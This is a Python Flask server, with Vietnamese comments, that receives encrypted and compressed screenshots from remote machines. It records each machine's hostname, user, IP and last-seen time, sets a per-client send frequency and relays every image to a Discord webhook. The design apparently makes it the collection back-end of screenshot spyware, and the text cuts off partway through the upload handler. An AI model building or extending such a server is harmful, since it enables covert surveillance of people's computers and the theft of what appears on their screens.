from flask import Flask, request, jsonify, send_file, render_template
from flask_sqlalchemy import SQLAlchemy
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from cryptography.fernet import Fernet
from dotenv import load_dotenv
from PIL import Image
import io, base64, zlib, threading, os
from datetime import datetime, timedelta
import requests

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///db.sqlite3'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
limiter = Limiter(app, key_func=get_remote_address)
fernet = Fernet(os.getenv("FERNET_KEY"))
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
API_TOKEN = os.getenv("API_TOKEN")
SAVE_FOLDER = "received"
os.makedirs(SAVE_FOLDER, exist_ok=True)
session = requests.Session()

class Screenshot(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    hostname = db.Column(db.String(100))
    user = db.Column(db.String(100))
    filename = db.Column(db.String(150))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    filesize = db.Column(db.Integer)
    status = db.Column(db.String(20), default="received")  # e.g. received, sent_to_discord

class Client(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    hostname = db.Column(db.String(100), unique=True)
    user = db.Column(db.String(100))
    ip = db.Column(db.String(50))
    last_seen = db.Column(db.DateTime)
    active = db.Column(db.Boolean, default=True)
    send_frequency = db.Column(db.Integer, default=60)  # seconds

db.create_all()

def decrypt_and_decompress(data_base64):
    encrypted_data = base64.b64decode(data_base64)
    decrypted = fernet.decrypt(encrypted_data)
    return zlib.decompress(decrypted)

def process_image(img_bytes):
    # Resize, convert to webp, compress
    image = Image.open(io.BytesIO(img_bytes))
    max_size = (1920, 1080)
    image.thumbnail(max_size)
    output = io.BytesIO()
    image.save(output, format='WEBP', quality=75)
    return output.getvalue()

def send_discord_async(filename, img_bytes):
    def task():
        try:
            files = {"file": (filename, io.BytesIO(img_bytes), "image/webp")}
            data = {"content": f"📷 Ảnh mới nhận: `{filename}`"}
            r = session.post(DISCORD_WEBHOOK_URL, data=data, files=files, timeout=10)
            print(f"[Discord] status: {r.status_code}")
        except Exception as e:
            print(f"[Discord Error]: {e}")
    threading.Thread(target=task, daemon=True).start()

@app.route("/upload", methods=["POST"])
@limiter.limit("10/minute")
def upload():
    # Xác thực token
    auth = request.headers.get("Authorization", "")
    if auth != f"Bearer " + API_TOKEN:
        return jsonify({"error": "Unauthorized"}), 401

    try:
        data = request.get_json()
        sys_info = data.get("system_info", {})
        user = sys_info.get("user", "unknown")
        hostname = sys_info.get("hostname", "unknown")
        screenshot_b64 = data["screenshot"]

        decrypted = decrypt_and_decompress(screenshot_b64)
        optimized_img = process_image(decrypted)

        filename = f"{hostname}_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.webp"
        path = os.path.join(SAVE_FOLDER, filename)
        with open(path, "wb") as f:
            f.write(optimized_img)

        # Ghi database
        ss = Screenshot(hostname=hostname, user=user, filename=filename, filesize=len(optimized_img))
        db.session.add(ss)
        db.session.commit()

        # Cập nhật client info
        ip = request.remote_addr
        client = Client.query.filter_by(hostname=hostname).first()
        if not client:
            client = Client(hostname=hostname, user=user, ip=ip, last_seen=datetime.utcnow())
            db.session.add(client)
        else:
            client.last_seen = datetime.utcnow()
            client.ip = ip
